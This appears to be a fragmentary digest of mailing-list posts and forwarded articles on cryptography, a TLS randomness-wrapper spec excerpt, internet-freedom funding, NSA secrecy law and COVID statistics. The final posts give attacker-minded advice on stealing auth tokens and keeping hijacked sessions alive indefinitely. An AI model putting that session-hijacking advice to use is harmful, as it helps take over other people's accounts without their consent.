Both tagsMUSTbe generated such that they never collide with another contender or owner of the private key. This can happen if, for example, one HSM with a private key is used from several servers or if virtual machines are cloned.
TheRECOMMENDEDtag construction procedure is as follows:
tag1:Constant string bound to a specific device and protocol in use. This allows caching of Sig(sk, tag1). Device-specific information may include, for example, a Media Access Control (MAC) address. To provide security in the cases of usage of CSPRNGs in virtual environments, it isRECOMMENDEDto incorporate all available information specific to the process that would ensure the uniqueness of each tag1 value among different instances of virtual machines (including ones that were cloned or recovered from snapshots). This is needed to address the problem of CSPRNG state cloning (see[[RY2010]( See[Section 5]( example protocol information that can be used in the context of TLS 1.3. If sk could be used for other purposes, then selecting a value for tag1 that is different than the form allowed by those other uses ensures that the signature is not exposed.
tag2:A nonce, that is, a value that is unique for each use of the same combination of G(L), tag1, and sk values. The tag2 value can be implemented using a counter or a timer, provided that the timer is guaranteed to be different for each invocation of G'(n).
[5.]( to TLS](
The PRF randomness wrapper can be applied to any protocol wherein a party has a long-term private key and also generates randomness. This is true of most TLS servers. Thus, to apply this construction to TLS, one simply replaces the "private" CSPRNG G(n), i.e., the CSPRNG that generates private values, such as key shares, with
G'(n) = HKDF-Expand(HKDF-Extract(H(Sig(sk, tag1)), G(L)), tag2, n)
[6.]( Guidance](
Recall that the wrapper defined in[Section 3]( L >= n - L', where L is the Extract output length and n is the desired amount of randomness. Some applications may require n to exceed this bound. Wrapper implementations can support this use case by invoking G' multiple times and concatenating the results.
[7.]( Considerations](
This document has no IANA actions.
[8.]( Considerations](
A security analysis was performed in[[SecAnalysis]( Generally speaking, the following security theorem has been proven: if Adv learns only one of the signature or the usual randomness generated on one particular instance, then, under the security assumptions on our primitives, the wrapper construction should output randomness that is indistinguishable from a random string.
The main reason one might expect the signature to be exposed is via a side-channel attack. It is therefore prudent when implementing this construction to take into consideration the extra long-term key operation if equipment is used in a hostile environment when such considerations are necessary. Hence, it is recommended to generate a key specifically for the purposes of the defined construction and not to use it another way.
The signature in the construction, as well as in the protocol itself,MUST NOTuse randomness from entropy sources with dubious security guarantees. Thus, the signature schemeMUSTeither use a reliable entropy source (independent from the CSPRNG that is being improved with the proposed construction) or be deterministic; if the signatures are probabilistic and use weak entropy, our construction does not help, and the signatures are still vulnerable due to repeat randomness attacks. In such an attack, Adv might be able to recover the long-term key used in the signature.
Under these conditions, applying this construction should never yield worse security guarantees than not applying it, assuming that applying the PRF does not reduce entropy. We believe there is always merit in analyzing protocols specifically. However, this construction is generic so the analyses of many protocols will still hold even if this proposed construction is incorporated.
The proposed construction cannot provide any guarantees of security if the CSPRNG state is cloned due to the virtual machine snapshots or process forking (see[[MAFS2017]( It isRECOMMENDEDthat tag1 incorporate all available information about the environment, such as process attributes, virtual machine user information, etc.
[9.]( to RFC 6979](
The construction proposed herein has similarities with that of[[RFC6979]( both of them use private keys to seed a deterministic random number generator.[Section 3.3]( [[RFC6979]( deterministically instantiating an instance of the HMAC_DRBG pseudorandom number generator, described in[[SP80090A]( Annex D of[[X962]( using the private key sk as the entropy_input parameter and H(m) as the nonce. The construction G'(n) provided herein is similar, with such difference that a key derived from G(n) and H(Sig(sk, tag1)) is used as the entropy input and tag2 is the nonce.
However, the semantics and the security properties obtained by using these two constructions are different. The proposed construction aims to improve CSPRNG usage such that certain trusted randomness would remain even if the CSPRNG is completely broken. Using a signature scheme that requires entropy sources according to[[RFC6979]( intended for different purposes and does not assume possession of any entropy source -- even an unstable one. For example, if in a certain system all private key operations are performed within an HSM, then the differences will manifest as follows: the HMAC_DRBG construction described in[[RFC6979]( be implemented inside the HSM for the sake of signature generation, while the proposed construction would assume calling the signature implemented in the HSM.

How Cryptography Lets Down Marginalized Communities
Speaking at a prestigious crypto conference this month, Seny Kamara called on the field to recognize its blind spots—and fix them.

One of the perennial highlights of the International Association for Cryptologic Research's Crypto conference is the "invited talk." For an hour each year, a prominent scholar shares a big idea or new perspective on the protocols, algorithms, and math problems that underlie cutting-edge encryption. It's usually a deeply technical bacchanal, but this year was not. Prolific academic cryptographer Seny Kamara of Brown University had something other than formulas and theorems on his mind.
"So an actual question then is OK, well, what am I doing here, right?" Kamara asked the livestream attendees. "Why am I giving a talk at Crypto if I'm not talking about technical things? And, you know, basically I'm here because Ahmaud Arbery was killed in February, because Breonna Taylor was killed by a police officer in March, and because George Floyd was also killed by police officers in May."
The talk, dubbed [Crypto for the People]( and given on August 19, examined the question of who really benefits from encryption technologies and advances in cryptographic research. It sounded a call to reexamine research priorities that today largely serve the interests of governments and corporations instead of marginalized people, be they racial minorities, immigrants, women, the LGBTQ community, or others. As an immigrant and Black American—and one of the few Black academic cryptographers in the world—Kamara pointed out that even the open source community and movements like the cypherpunks largely don't directly work to address these needs. They are focused on taking power from corporations and developing technologies to defend people from mass government surveillance and digital intrusion, but generally not on developing encryption technologies and new areas of abstract theory that are specifically motivated by the needs of underserved communities.
"As long as I’ve been studying and working in cryptography and computer science, about 20 years now, it was always very clear to me that my own work and other people’s work was disconnected from my life experiences," Kamara tells WIRED. "I believed it could have an impact on people’s privacy as a whole, but I didn't think I would have cared about any of it when I was 13 or 15 and growing up in New York City. And that disconnect always bothered me."
So much of cryptographic research is abstract and mathematical—divorced from real-world conditions—that it can be easy to simply let all lines of inquiry exist only in that theoretical space. And Kamara argues that even when encryption technologies are brought to underserved communities, they arrive retrofitted from other research projects, rather than conceived based on the needs of the vulnerable and the specific threats they face.
"There are problems and adversarial models that are unique to marginalized groups, and those problems are not being investigated."
Seny Kamara, Brown University
"As academics working on policy questions, we motivate our work in grant applications and so on by arguing that it benefits the people in some way," says Abdoulaye Ndiaye, a macroeconomics researcher at New York University who discovered Kamara's Crypto talk on Twitter. "However, the consumers of our research are other academics, government institutions, and, in some fields, businesses. There is this underlying assumption that these entities will implement the research and it will trickle down to the underserved people. Dr. Kamara highlighted that in cryptography the incentives of the government and the business are not necessarily aligned with underserved people, the missing link in this trickle down."
Encryption technologies do provide protection to vulnerable groups around the world like political dissidents, activists, and journalists. Kamara's talk made the case, though, that purpose-built cryptography could accomplish so much more.
In his own research at Brown, for example, Kamara and his colleagues have done work motivated by law enforcement databases in the United States that track alleged criminals like possible gang members. In a 2015 audit of a California state platform called CalGang, for example, 42 people entered in the database were under the age of 1 year old. In a sample of 100 entries from the database, 13 of the people represented should not have been in the database at all, and 131 of the 563 evidence points used against the 100 people were not supported.
So Kamara has worked on developing secure database schemes in which data can be audited and checked privately but transparently, that does not allow data to be exported or duplicated, and that deletes entries automatically after a given amount of time without special authorization from an authority like a judge.
"I think there is an intersection between traditional cryptography and privacy and what I was calling 'crypto for the people,'" Kamara says. "There is research and there are tools that can be beneficial to large subsets of people, as in the [encrypted messaging app Signal]( But there are also problems and adversarial models that are unique to marginalized groups, and those problems are not being investigated. For example, not everyone ends up in a gang database, and certainly very few cryptographers or academic computer science researchers end up in gang databases."
Kamara also advocated using the flexibility and security of tenured professorships as an opportunity to push the envelope of what cryptographic research can be—including in the case of his own talk. "I went into it thinking, 'I’m glad I have tenure, because this is going to cost me,'" he says. But Kamara says the response has been very positive so far. "I’m sure there are many others who disagree and didn’t like the talk, but so far they haven’t reached out to let me know," Kamara says.
The long-standing question of morality in cryptography rarely makes it to the foreground, even within the academic community itself. The discourse flared up in the wake of Edward Snowden's 2013 revelations about mass digital surveillance by the National Security Agency, particularly after a [seminal 2015 paper]( by UC Davis cryptographer Phillip Rogaway, which made the case that cryptography is "an inherently political tool" with "an intrinsically moral dimension."
"I plead for a reinvention of our disciplinary culture to attend not only to puzzles and math, but, also, to the societal implications of our work," Rogaway wrote.
Five years later, he says he doesn't see many changes in the research most cryptographers are doing or the topics they are discussing at conferences. But he adds that he was impressed with Kamara's talk and the steps it took to move the discourse forward. The essay Rogaway wrote in 2015, he says, would now include not just a discussion of the ethical need to defend the masses against mass surveillance, but an entreaty that the academic community focus more of its work on serving marginalized groups.
"We don’t work in a vacuum and we’re not pure mathematicians," Rogaway told WIRED. "As much as certain cryptographers would like to see themselves as doing pure mathematics on some kind of quest of discovery, that’s not an apt description of where we sit. The field does have these very strong political connections and connections to power. And if we just say, 'Oh, that’s not my domain,' that in itself is a really politically situated, ahistorical view and ultimately quite elitist."
Today, partly because of rapidly expanding anti-abuse work on social networks and communication platforms, the idea of an ethical imperative in privacy technologies has become more mainstream. But much of the actual work in cryptography remains fundamentally abstract. The practical applications that do exist often originated with a narrow field of view.
"Building the same stuff you always did but claiming that it's for people in marginalized communities is not the same thing as human-centric threat modeling," wrote Lea Kissner, a cryptographer and security engineer focused on anti-abuse and privacy, in a [series of tweets]( about Kamara's talk last week.
The type of tailored, threat-specific research Kamara described requires intimate knowledge of the actual, nuanced needs of a marginalized group. Kamara emphasized in his talk that the cryptography community needs to be much more inclusive and representative if it wants to help the vulnerable. And researchers need to seek firsthand expertise to gain a deeper understanding case by case.
"I think the only reason we have a hard time imagining what this looks like is because, effectively, we’ve been trained for 40 years to do corporate research. So we lack the imagination, skills, and knowledge to do research 'for the people,'" Kamara says. "But diversity is crucial for this."
Following the shootings of Breonna Taylor, George Floyd, and Jacob Blake, Kamara says fellow cryptographers and other computer scientists have reached out to him to talk about systemic changes that could be aided by technical solutions to reduce police brutality. Kamara says he welcomes these discussions, "but most of those people have never been attacked by the police. They don’t understand the psychological pressure you’re under and the confusion you’re experiencing when five cops are running at you. These kinds of details matter."

consciousness all about randomness as well, or the boundary between entropy and stasis.
it's interesting to see technology shape the historical narrative. in the past, manipulation oriented around secrecy and falsity. today we see profligacy of falsity - ever harder to find the proverbial needle in the exploding digital haystack!
the digital sea is tailor made for confirmation bias :)

existence - a mystery to everybody!
fun developments in this regard:
"Does quantum theory apply at all scales, including that of observers? New light on this fundamental question has recently been shed through a resurgence of interest in the long-standing Wigner’s friend paradox. This is a thought experiment addressing the quantum measurement problem—the difficulty of reconciling the (unitary, deterministic) evolution of isolated systems and the (non-unitary, probabilistic) state update after a measurement. Here, by building on a scenario with two separated but entangled friends introduced by Brukner, we prove that if quantum evolution is controllable on the scale of an observer, then one of ‘No-Superdeterminism’, ‘Locality’ or ‘Absoluteness of Observed Events’—that every observed event exists absolutely, not relatively—must be false."
- perhaps entropy invades locality, due to entanglement, throughout the universe?
a crux here: in cryptography we know that simulations of randomness (or appearance of randomness) are flawed - they do contain the entropy they appear! question becomes: is this flaw exploitable?
using key expansion, we take a small amount of entropy and expand it indefinitely, with the appearance and capability of unknowable-ness. flawed, but not exploitable!
dark energy the cost of key expansion of our universal seed state? perhaps questions of existence to be answered in finding such a secret...
best regards,
P.S. i recently read about a study showing randomness as key to sensor efficacy in low signal environments. it seems nature has long relied on this technique of stochastic resonance to amplify capability!
To make a better sensor, just add noise
by Walt Mills, Pennsylvania State University
Adding noise to enhance a weak signal is a sensing phenomenon common in the animal world but unusual in manmade sensors. Now Penn State researchers have added a small amount of background noise to enhance very weak signals in a light source too dim to sense.
In contrast to most sensors, for which noise is a problem that should be suppressed, they found that adding just the right amount of background noise can actually increase a signal too weak for sensing by normal sensors, to a level that can reach detectability.
Although their sensor, based on a two-dimensional material called molybdenum disulfide, detects light, the same principle can be used to detect other signals, and because it requires very little energy and space compared to conventional sensors, could find wide adaptation in the coming Internet of Things (IoT). IoT will deploy tens of millions of sensors to monitor conditions in the home and factories, and low energy requirements would be a strong bonus.
"This phenomenon is something that is frequently seen in nature," says Saptarshi Das, an assistant professor of engineering science and mechanics. "For example, a paddlefish that lives in muddy waters cannot actually find its food, which is a phytoplankton called Daphnia, by sight. The paddlefish has electroreceptors that can pick up very weak electric signal from the Daphnia at up to 50 meters. If you add a little bit of noise, it can find the Daphnia at 75 meters or even 100 meters. This ability adds to the evolutionary success of this animal."
Another interesting example is the jewel beetle, which can detect a forest fire at 50 miles distance. The most advanced infrared detector can only detect at 10 to 20 miles. This is due to a phenomenon these animals use called stochastic resonance.
"Stochastic resonance is a phenomenon where a weak signal which is below the detection threshold of a sensor can be detected in the presence of a finite and appropriate amount of noise," according to Akhil Dodda, a graduate student in engineering science and mechanics and co-first author on a new paper appearing this week in Nature Communications.
In their paper, the researchers demonstrate the first use of this technique to detect a subthreshold photonic signal.
One possible use being considered is for troops in combat. Army personnel in the field already carry very bulky equipment. It is unfeasible to add the heavy, power-hungry equipment required to enhance a subthreshold signal. Their technique is also applicable in resource-constrained environments or beneath the ocean where people want to monitor very weak signals. It could also be used in volcanic locations or to monitor earthquakes in time to give an alarm.
"Who would have thought that noise could play a constructive role in signal detection? We have challenged tradition to detect otherwise undetectable signals with miniscule energy consumption. This can open doors to a totally unexplored and ignored field of noise enhanced signal detection," said Aaryan Oberoi, a graduate student from the Department of Engineering Science and Mechanics and co-first author on the paper.
Their next step is to demonstrate this technique on a silicon photodiode, which would make the device very scalable. Any state-of-the art sensor can be enhanced by this concept, Das says.

- TL;DR: for the IPFS Tor support issue:
IPFS wants a security audit before merging Tor support. Tor support was volunteer effort - no paid security review possible. Thus - IPFS does not support Tor :/

Scoop: Open Technology Fund sues administration for $20M in missing funds
[Sara Fischer]( author of [Media Trends](
The Open Technology Fund (OTF) is suing the U.S. Agency for Global Media (USAGM) over roughly $20 million in congressionally appropriated funds it says the government is refusing to provide, Axios has learned.
Why it matters: There's [bipartisan uproar from Congress]( over the funding that OTF says is being withheld. The USAGM, whose new CEO is seeking to replace OTF leaders with Trump loyalists, is required by law to provide the funding via federal grants, but it has given shifting rationales for why the money has been held up.
The big picture: The OTF is a government-supported nonprofit focused on advancing internet freedom. Without funds, it can't support work by activist journalists in places like Hong Kong and Belarus, where authorities are increasingly cracking down on internet freedom.
Details: The lawsuit, set to be filed Thursday in federal claims court, alleges the USAGM breached its contracts with the OTF in three ways:
- It withheld about $9.4 million in funding that it owes under OTF’s 2020 grant agreement.
- It withheld an additional $9.8 million in prior OTF program grants held by Radio Free Asia, OTF’s former parent organization.
- A USAGM senior adviser "engaged in transparently pretextual efforts to force OTF into breaching its grant agreement."
The lawsuit also says two chief financial officers at the USAGM flagged that it was illegal to withhold the funds, but the USAGM tried to move forward with the plan anyway.
- The first CFO, Grant Turner, a longtime career civil servant, was ordered by a USAGM adviser last week to “cease and desist” transferring a portion of the promised OTF funding. Turner also protested the unlawful transfer of
those OTF funds to another account.
- Turner said, according to the lawsuit, that the USAGM's efforts are a “thin cover” for the “operational destruction” of the OTF.
- The following day, Turner’s replacement, acting CFO John Barkhamer, also refused to comply with the order to transfer funds into another account, according to the lawsuit. He resigned in protest and reported USAGM leadership's conduct to the inspector general for the agency.
Be smart: The issue of funding the OTF is particularly sensitive, given that the USAGM [announced]( on Tuesday that it plans to create and fund its own Office of Internet Freedom. Sources fear the agency is withholding the OTF's funds in order to shift them to its new agency, which is illegal if done without congressional approval.

State sanctioned secrecy: NSA's criminality shield
Last week, the U.S. Court of Appeals for the 9th Circuit [ruled that the National Security Agency (NSA)]( telephone metadata program first [exposed]( in June 2013 by whistleblower Edward Snowden "...may have violated the Fourth Amendment and did violate the Foreign Intelligence Surveillance Act ("FISA") when it collected the telephony metadata of millions of Americans..." The program was repeatedly reauthorized by Congress before finally (allegedly) being shelved in 2019, despite a Trump administration effort to [revive legal authority for it]( Snowden recognized the program's inherent criminality and unconstitutional character, which is precisely why he exposed it - and why all pending federal charges against him should be dismissed with prejudice.
Unfortunately, NSA still has a critical legal tool to hide other criminal or unconstitutional acts: the six-decade old National Security Agency (NSA) Act of 1959 ([P. L. 86-36](
Enacted at the height of the Cold War, the NSA Act gives the agency radically sweeping powers to withhold any information from public disclosure. Specifically, Section 6 of the Act states "...nothing in this Act or any other law...shall be construed to require the disclosure of the organization or any function of the National Security Agency, or any information with respect to the activities thereof, or of the names, titles, salaries, or number of the persons employed by such agency."
NSA has used that blanket authority to try to keep secret details about its lethal 9/11 intelligence failure. A Freedom of Information Act (FOIA) lawsuit I brought on behalf of the Cato Institute against the Defense Department (NSA's parent organization) in January 2017 has, after over three-and-a-half years in federal court, partially punctured NSA's veil of secrecy over the cancelled TRAILBLAZER and THINTHREAD digital network exploitation (DNE) programs.
In brief, during the five-year period leading up to the 9/11 attacks, a bureaucratic war raged inside of NSA over the best way to handle the exploding volume of digital communications the agency was trying to keep up with. On one side was a group of veteran NSA cryptographers, mathematicians and computer scientists who developed a cheap, extremely effective, and Constitutionally compliant in-house DNE system codenamed THINTHREAD. On the other side was then-NSA Director Michael Hayden, who favored an unproven, external, contractor developed DNE system called TRAILBLAZER. When then-GOP House Intelligence Committee staffer [Diane Roark]( got the THINTHREAD team development money and language in the FY 2002 Intelligence Authorization bill directing wider deployment of the cheaper, off-the-shelf THINTHREAD system, Hayden refused to deploy it as directed - even though THINTHREAD, still in prototype development, was already producing intelligence NSA couldn't get from any of its other existing systems.
Three weeks before the 9/11 attacks, Hayden killed further THINTHREAD development, despite the fact that TRAILBLAZER was still little more than an idea on PowerPoint slides. The former THINTHREAD team members believe to this day that had their system been deployed even a few weeks before the 9/11 attacks, bin Laden's hijackers would never have made it onto a single plane. I agree.
Ultimately, Hayden would squander at least $696 million on TRAILBLAZER between October 2001 and September 2005; the money produced exactly one failed prototype DNE system. The total is likely far higher, as the full amount of money wasted on TRAILBLAZER remains classified.
The only reason we know these facts is because of the Cato Institute FOIA lawsuit (managed by [Josh Burday]( of [Loevy & Loevy]( which focused on NSA's attempts to prevent multiple Department of Defense Inspector General (DoD IG) reports on the TRAILBLAZER and THINTHREAD systems from ever seeing the light of day (you can read the still heavily redacted but revealing 2004 DoD IG report [here]( and the 2006 report [here](
Those reports only came about because the original THINTHREAD team members filed a DoD IG hotline complaint about TRAILBLAZER in September 2002. I learned about and actually read the classified versions of those reports while working for then-Rep. [Rush Holt]( (D-N.J.) in 2013. After Holt's retirement from Congress in 2014, I continued to pursue my investigation into the scandal after joining the Cato Institute, filing the FOIA lawsuit in January 2017.
Throughout the lawsuit, NSA and DoD lawyers repeatedly invoked Section 6 of the NSA Act to try to keep as much of the TRAILBLAZER/THINTHREAD scandal secret as possible. However, the threat of an actual public FOIA trial - ordered by DC Circuit Judge Trevor McFadden - finally forced NSA to disclose the amount cited above. Unfortunately, the [2016 FOIA Improvements Act]( passed by Congress does not provide FOIA requestors the necessary legal tools to overcome the government accountability and transparency barrier represented by the NSA Act. NSA dug in its heels and refused to release any further information.
No legal mechanism exists to allow myself and the former THINTHREAD team members to have our security clearances restored so we could fight out the classification and disclosure battle in camera before the judge. And despite our request, Judge McFadden declined to use an existing [precedent]( to appoint a cleared Special Master (court appointed legal or technical experts who advise judges in cases) to review 800 pages of still-classified material in the case to determine whether, in fact, NSA was improperly invoking the NSA Act to conceal still other illegal acts - like Hayden's refusal to follow the law and more widely deploy THINTHREAD as ordered by Congress, which we had finally pressured NSA into revealing. The existing [executive order]( on classification and declassification expressly forbids such acts, but there is nothing in statute requiring such a review in FOIA cases, and at present there is no legal penalty for the kind of misuse of the NSA Act that NSA employed in this episode. Faced with these barriers, we were forced to settle the case this month.
The problem is that the NSA Act is what is known as a "(b)(3)" FOIA exemption statute - meaning that it is an existing law that can be used to withhold information from the public in spite of FOIA. The 2016 FOIA Improvements Act failed to address that problem, which also applies to laws allowing the CIA, Office of the Director of National Intelligence, and other federal department and agencies to withhold - often in blanket form - information that might reveal waste, fraud, abuse, mismanagement or even criminal conduct.
If NSA or any other department or agency that currently enjoys the use of a "(b)(3)" exemption statute is allowed to keep it, you can take it to the bank they will use it to conceal bad management, wasteful spending, and even criminal conduct. If Congress were to strike Section 6 of the NSA Act, it would go a long way towards improving public oversight and government transparency as it pertains to NSA, but much more is needed.
In the TRAILBLAZER/THINTHREAD episode, the agency that was the subject of investigation - NSA - used Section 6 of the NSA Act to try to prevent highly critical audit and investigation reports by another DoD element - the DoD IG - from ever being revealed. When the entity being audited can prevent the auditor from reporting findings of wrongdoing to taxpayers, the system is by definition corrupt. Congress should statutorily bar any agency or department subjected to an IG or Government Accountability Office (GAO) audit from blocking release of that report to the public.
Additionally, Congress should mandate judicial in camera reviews in FOIA cases involving classified information or in which a "(b)(3)" exemption statute (if still on the books) is invoked to determine whether it is being misused by an executive branch department or agency to conceal waste, fraud, abuse, mismanagement or criminal conduct. An outright statutory bar on using any law to conceal the aforementioned misconduct should likewise be enacted.
Americans should not have to rely on whistleblowers like Snowden to reveal our government is targeting us for unconstitutional surveillance behind a shield of secrecy. Nor should executive branch bureaucrats be able to conceal their misconduct behind false claims that exposing their ineptitude or criminality would involve "compromising sources and methods."

from there is only support for one radio and one network interface. past mesh networking experience has shown the value of multiple radios, in particular combining some long range directional with close range isotropic broadcast. in turn, this means more complicated routing protocols - but significantly better performance!
this inherently inflexible design reminds of the OLPC mesh capabilities... which rapidly dropped to unusable with modest distance or interference.

the mortality this winter is going to be interesting. USA doing nearly nothing to prepare.
with CDC corruption in progress, perhaps the Russian approach will be adopted :)
Tatiana Golikova, the head of Russia's coronavirus crisis centre, told President Vladimir Putin in late July that Russia's coronavirus mortality rate was "significantly lower than in a range of other countries".
But data released by the Rosstat State Statistics Service on Sept. 4 show there were 57,800 excess deaths between May and July, the peak of the outbreak.
The figure was calculated by comparing fatalities over those three months in 2020 with the average number of May-July deaths between 2015 and 2019. The excess total is more than three times greater than the official May-July COVID-19 death toll of 15,955.
Alexei Raksha, a demographer who worked for Rosstat until this summer, said the jump in Russian deaths illustrated the real toll from COVID-19, and that authorities had reported only some of the deaths publicly.
"In fact, the fatality rate in Russia differs only a little from other countries," said Raksha.

... [ provocations, good trouble ] ...
more common than attacking 2nd factor is session riding or browser jacking, using the existing auth token exfiltrated. you're then "the target" and can do as you please (until session expires).
if you can attack over wifi or LAN, this is almost always easiest.
they can identify this behavior as "anomalous".  if they want to help or not, good luck...
the oldest tricks still the best tricks. if you can jack session and achieve ends, without exotic exploits or extraordinary access, all the better!
sounds like a target :)

note that you don't need to change passwords to accounts to be able to use them. in fact, changing passwords usually requires re-authentication, but extending a session indefinitely is free! :)
this is the dirty little secret in infosec: authorized session life cycle is almost always too lenient and too long.  for example, many services don't even bind a session to an IP, so session jacking you across the globe throws up no issues.
you can have sessions that don't expire upon password change - you must instead go through a separate step to kill existing sessions!
you can have hijacked sessions that simply renew, indefinitely, keep an active connection to your accounts for days, months, years (!!) without ever having to enter credentials.
most of the time this is laziness on behalf of service provider. even the big ones.  sometimes usability is given priority over security - can't cause an inconvenience for users!  they won't get hacked...
end result: most services handle sessions sloppily; caveat emptor.
